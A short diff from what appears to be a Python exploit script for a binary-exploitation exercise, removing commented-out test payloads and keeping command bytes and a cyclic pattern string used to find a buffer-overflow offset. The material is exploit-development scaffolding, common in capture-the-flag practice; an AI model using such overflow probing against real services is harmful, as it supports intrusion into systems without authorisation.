@@ -18,16 +18,6 @@ CMD1= binascii.unhexlify("01")
 CMD2= binascii.unhexlify("02")
 READ_BUFFER=CMD3 = binascii.unhexlify("03")
 FILE_DESCRIPTOR=4
-
-#payload =struct.pack('>Q', 0x0105414243444503)
-#payload="\x01\x05"+"\x41"*5+"\x03" # test put AAAAA into receive it
-#payload = p64("0x01024142")
-#p.sendline(payload)
-#print(p.recv())
-
-##### test the bof
-# write into all the buffer and read the input
-#pattern_create of 255 
 pattern= """AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%"""
 
 # Args loader
